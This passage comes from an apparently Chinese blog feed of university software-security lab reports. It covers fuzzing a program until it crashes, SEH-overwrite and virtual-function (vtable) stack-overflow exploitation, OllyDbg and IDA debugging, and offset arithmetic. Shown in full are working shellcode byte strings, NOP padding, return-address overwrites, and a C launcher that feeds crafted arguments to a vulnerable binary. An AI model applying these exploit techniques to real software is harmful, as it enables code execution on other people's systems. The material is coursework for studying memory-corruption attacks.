class="string">""</span>.join(text)</span><br><span class="line"><span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">j+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"程序运行大约%d次后崩溃!"</span>%((i<span class="number">-1</span>)*<span class="number">4</span>*<span class="number">100</span>+j*<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> t &lt; <span class="number">100</span>:</span><br><span class="line">fp = open(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">fp.write(<span class="string">"aaaa"</span>*(i<span class="number">-1</span>)*<span class="number">100</span>+<span class="string">"aaaa"</span>*(j<span class="number">-1</span>)*<span class="number">10</span>+<span class="string">"a"</span>*t)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br><span class="line">text = p.readlines()</span><br><span class="line">string = <span class="string">""</span>.join(text)</span><br><span class="line"><span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">t+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"程序运行%d次后崩溃!"</span>%((i<span class="number">-1</span>)*<span class="number">4</span>*<span class="number">100</span>+(j<span class="number">-1</span>)*<span class="number">4</span>*<span class="number">10</span>+t)</span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="string">"\x8B\x94\xF8\x77"</span></span><br><span class="line">shellcode = <span class="string">"\x33\xDB\x53\x68\x31\x32\x33\x34\x68\x41\x42\x43\x44\x8B\xC4\x53\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">fp.write(<span class="string">"aaaa"</span>*(i<span class="number">-1</span>)*<span class="number">100</span> + <span class="string">"aaaa"</span>*(j<span class="number">-1</span>)*<span class="number">10</span> + <span class="string">"a"</span>*t + <span class="string">"a"</span>*<span class="number">3</span> + jmp_esp + shellcode)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br></pre></td></tr></table></figure></li><li><p>运行<code>python</code>脚本，植入<code>shellcode</code>成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565856219819.png" alt="1565856219819"></p></li><li><p>最终生成的<code>password.txt</code>文件如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565856255135.png" alt="1565856255135"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 模糊测试 </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚函数攻击和SEH攻击 实验报告</title>
      <link href="/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E5%92%8CSEH%E6%94%BB%E5%87%BB-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E5%92%8CSEH%E6%94%BB%E5%87%BB-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>了解<code>SEH</code>攻击和虚函数攻击的基本原理；</li><li>调试虚函数攻击代码，理解虚函数工作机制与内存分布方式，掌握基本的虚函数攻击与计算方式，并可以用<code>OllyDbg</code>追踪；</li><li>通过调试<code>SEH</code>攻击代码，理解<code>Windows</code>异常处理机制，掌握针对<code>SEH</code>的攻击方式，并利用<code>OllyDbg</code>跟踪异常状态。 <a id="more"></a></li></ol><h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x34\x33\x32\x31\x68\x44\x43\x42\x41\x8B\xC4\x53"</span></span><br><span class="line"><span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x48\xFE\x12\x00"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyExceptionHandler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"got an exception,press Enter to kill process!\n"</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="comment">//printf("%d",strlen(shellcode));</span></span><br><span class="line"><span class="keyword">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf,input);</span><br><span class="line">zero=<span class="number">4</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="comment">//test("abc");</span></span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>函数<code>MyExceptionhandler()</code>是异常处理函数;</li><li><code>Test()</code>函数的<code>strcpy</code>处是典型栈溢出漏洞;</li><li><code>_try{}</code>在<code>test</code>函数栈帧中安装一个<code>S.E.H结构</code>，其中除<code>0</code>操作会产生异常。<code>strcpy</code>操作没有产生溢出时，除<code>0</code>操作产生的异常会被异常处理函数处理，而当<code>strcpy</code>操作产生溢出时，会将栈帧中<code>S.E.H</code>异常处理句柄改为<code>shellcode</code>入口地址，代码植入成功。</li></ol><h1 id="调试SEH攻击代码"><a href="#调试SEH攻击代码" class="headerlink" title="调试SEH攻击代码"></a>调试SEH攻击代码</h1><ol><li><p>为了能出发<code>int 3</code>断点时启动<code>OllyDbg</code>，设置<code>OllyDbg</code>为实时调试器</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851188253.png" alt="1565851188253"></p></li><li><p>运行刚刚创建的<code>SHE_attack.exe</code>，发现要求创建<code>UDD</code>目录</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851194716.png" alt="1565851194716"></p></li><li><p>运行刚刚创建的<code>SHE_attack.exe</code>，发现要求创建<code>UDD</code>目录</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851200766.png" alt="1565851200766"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851208465.png" alt="1565851208465"></p></li><li><p>两个路径设置成功后，重新运行<code>SHE_attack.exe</code>程序，成功在<code>int 3</code>上启动<code>OllyDbg</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851215407.png" alt="1565851215407"></p></li><li><p>在<code>strcpy</code>函数处设置断点，程序运行到此处时观察右下角缓冲区数据，可以看到在执行<code>strcpy</code>函数之前，<code>shellcode</code>的起始地址为<code>0x0012FE48</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851226446.png" alt="1565851226446"></p></li><li><p>执行完<code>strcpy</code>，确认<code>shellcode</code>的起始位置是<code>0x0012FE48</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851232753.png" alt="1565851232753"></p></li><li><p>查看<code>S.E.H链</code>，地址<code>0x0012FF18</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851240943.png" alt="1565851240943"></p></li><li><p>查看地址<code>0x0012FF18</code>的记录，发现其指向下一个<code>SHE指针</code>，接着是异常处理程序, 只需要把<code>0x0012FF1C</code>这个 地址的内容改成<code>shellcode</code>起始地址即可</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851300622.png" alt="1565851251908"></p></li><li><p>由于<code>shellcode</code>的起始地址为 <code>0x0012FE48</code>，第一个<code>S.E.H地址</code>为 <code>0x0012FF18</code>(指向下一个<code>S.E.H</code>的指针) <code>0x0012FF1C</code>(异常处理地址)，因此<code>shellcode</code>需要使用<code>0x0012FF1C-0x0012FE48=212</code>个字节进行填充。使用上次作业弹出框的<code>shellcode</code>，剩下的空间用<code>0x90</code>补齐至<code>212</code>字节，在<code>213-216</code>字节使用<code>0x0012FE48</code>填充，注释掉<code>_asm int 3</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849959690.png" alt="1565849959690"></p></li><li><p>启动程序，成功出现弹框</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849990658.png" alt="1565849990658"></p></li><li><p><code>shellcode</code>已经被执行，但是点击确定却没有反应，因为<strong><code>shellcode</code>已经被当作系统异常处理来进行了</strong>，所以点击确定不会退出程序。</p></li></ol><h1 id="调试虚函数攻击代码"><a href="#调试虚函数攻击代码" class="headerlink" title="调试虚函数攻击代码"></a>调试虚函数攻击代码</h1><ol><li><p>与<code>SEH</code>实验相同，运行<code>SHE_attack.exe</code>程序，成功在<code>int 3</code>上启动<code>OllyDbg</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851481979.png" alt="1565851481979"></p></li><li><p>在<code>strcpy</code>函数处设置断点，程序运行到此处时观察右下角缓冲区数据，可以看到在执行<code>strcpy</code>函数之前，<code>shellcode</code>的起始地址为<code>0x0042E27C</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851522215.png" alt="1565851522215"></p></li><li><p>根据<code>shellcode</code>起始地址<code>0042E27C</code>改写<code>shellcode</code>，<code>shellCode</code>长度为 <code>216 Bytes</code>，换算成十六进制为<code>D8</code>，故<code>shellcode</code>的末尾后四个字节地址是<code>0x0042E27C+0xD8–0x4=0x0042E350</code>修改源程序</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851692024.png" alt="1565851692024"></p></li><li><p>启动程序，成功出现弹框，shellcode植入成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851722541.png" alt="1565851722541"></p></li></ol><h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        可以利用栈溢出数据把<code>S.E.H</code>的异常处理函数地址替换为<code>shellcode</code>入口地址，让程序跳转去执行<code>shellcode</code>来实现我们自己的目的。</p><p>​        也可以通过利用虚函数原理达到攻击目的，让程序按照我们预先伪造的虚函数指针去寻找虚表，而在此处填上<code>shellcode</code>的起始地址作为伪造的虚函数入口地址，让程序跳转去执行<code>shellcode</code>。虚函数攻击原理如下：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851802367.png" alt="1565851802367"></p><p>​        通过以上两种方法都是利用了溢出手段来实现攻击目的，但是如今微软操作系统的安全性也在不断进步，很多溢出手段在新版本的操作系统上无法应用，日后还需要进行更加深入的研究。</p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>针对虚函数思考题程序，在不修改源代码的情况下，研究如何利用栈溢出的方式攻击目标代码，通过命令行的方式植入<code>shellcode</code>，弹出对话框。</p><ol><li><p>分析程序源代码，发现程序运行需要输入两个参数，并且<code>main()</code>函数两次调用<code>strcpy()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Class Vtable::test()"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Class Vtable1::test()"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vf <span class="built_in">overflow</span>, *p;</span><br><span class="line">vf1 overflow1, *p1;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//char * p_vtable;</span></span><br><span class="line"><span class="comment">//p_vtable=overflow.buf-4;//point to virtual table</span></span><br><span class="line"><span class="comment">//__asm int 3</span></span><br><span class="line"><span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line"><span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line"><span class="comment">//p_vtable[0]=0x30;</span></span><br><span class="line"><span class="comment">//p_vtable[1]=0xE4;</span></span><br><span class="line"><span class="comment">//p_vtable[2]=0x42;</span></span><br><span class="line"><span class="comment">//p_vtable[3]=0x00;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">overflow</span>.buf,argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcpy</span>(overflow1.buf,argv[<span class="number">2</span>]);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">p=&amp;<span class="built_in">overflow</span>;</span><br><span class="line">p-&gt;test();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"vf argv1 argv2\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用<code>ollydbg</code>打开<code>vf.exe</code>程序文件，没有找到调用<code>strcpy()</code>函数的命令，猜想可能是反汇编时使用其他函数代替了，使用<code>IDA</code>打开查看，找到<code>strcpy</code>处的地址为<code>0x0041193E</code>和<code>0x00411952</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852130345.png" alt="1565852130345"></p></li><li><p>分析反汇编代码，发现<code>0x00411974</code>处调用了<code>call dword ptr [edx]</code>，不同于常见的类似于<code>call sub_xxxxxx</code>的调用方式，这种看不见地址的调用是使用虚函数的标志。<code>mov ecx,dword_42EB08</code>访问指向这个对象开头的指针，而<code>mov edx,[ecx]</code>访问这个对象开头的前4个字节，最后<code>call dword ptr [edx]</code>调用虚函数。整个过程如下图所示。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852211877.png" alt="1565852211877"></p></li><li><p>使用<code>ollydbg</code>打开程序，在地址<code>0x0041193E</code>和<code>0x00411952</code>处设置断点，即在两个调用<code>strcpy</code>的地方设置断点。点击<code>调试-&gt;参数</code>，为程序输入命令行参数</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852252563.png" alt="1565852252563"></p></li><li><p>运行程序至两个断点处，观察右下角缓冲区数据，得到<code>dest1</code>的地址为<code>0x0042EB5C</code>，<code>dest2</code>的地址为<code>0x42EB14</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852281949.png" alt="1565852281949"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852289720.png" alt="1565852289720"></p></li><li><p>在数据窗口中追踪<code>dest1</code>的地址，为<code>0x0042801C</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852318989.png" alt="1565852318989"></p></li><li><p>之前分析<code>dword_42EB08</code>是对象开头的指针，根据地址<code>0x0041195A</code>处的汇编代码<code>mov dword_42EB08,offset unk_42EB58</code>表明<code>0x0042EB58</code>处是对象开头的位置了。<code>0X0042EB58</code>刚好在<code>dest</code>地址<code>0X0042EB5C</code>之前说明了调用的函数是虚函数，虚表指针地址为<code>0x0042801C</code></p></li><li><p>仍然使用前面实验的<code>shellcode</code>和计算地址的办法，把这个地方覆盖为<code>shellcode</code>尾部的地址<code>0x0042EB5C+0xD8-0x4=0x0042EC30</code>，<code>shellcode</code>尾部再填上伪造的虚函数入口地址即可。由于于<code>dest1</code>的地址刚好在虚表指针地址之后，<code>dest2</code>的地址在虚表指针地址之前，用<code>dest2</code>的地址进行覆盖</p></li><li><p>编写shellcode如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode1[]=</span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x31\x32\x33\x34\x68\x41\x42\x43\x44\x8B\xC4\x53"</span></span><br><span class="line"><span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x5C\xEB\x42\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode2[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x30\xEC\x42\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> command[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">memset</span>(command,<span class="number">0</span>,<span class="keyword">sizeof</span>(command));</span><br><span class="line"><span class="built_in">strcpy</span>(command,<span class="string">"\"C:\\vf.exe\" "</span>);</span><br><span class="line"><span class="built_in">strcat</span>(command,shellcode1);</span><br><span class="line"><span class="built_in">strcat</span>(command,<span class="string">" "</span>);</span><br><span class="line"><span class="built_in">strcat</span>(command,shellcode2);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>运行shellcode程序，成功弹出会话框</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852843165.png" alt="1565852843165"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚函数攻击 </tag>
            
            <tag> SEH攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞技术利用 实验报告</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>了解<code>shellcode</code>注入原理</li><li>理解给出的弹出对话框的汇编代码</li><li>通过淹没静态地址来实现<code>shellcode</code>的代码植入</li><li>通过跳板来实现<code>shellcode</code>的代码植入</li><li>尝试修改汇编语句的<code>shellcode</code>实现修改标题等简单操作 <a id="more"></a></li></ol><h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 